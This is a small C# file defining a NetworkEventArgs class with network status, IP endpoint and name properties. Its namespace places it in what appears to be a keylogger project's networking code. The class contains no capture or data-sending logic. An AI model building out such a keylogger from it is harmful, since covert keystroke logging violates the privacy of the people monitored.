using System;
using System.Net;

namespace KeyLogger.Network.Events
{
    public class NetworkEventArgs : EventArgs
    {
        public NetworkStatus NetworkStatus { get; set; }
        public IPEndPoint Ip { get; set; }
        public string Name { get; set; }
    }
}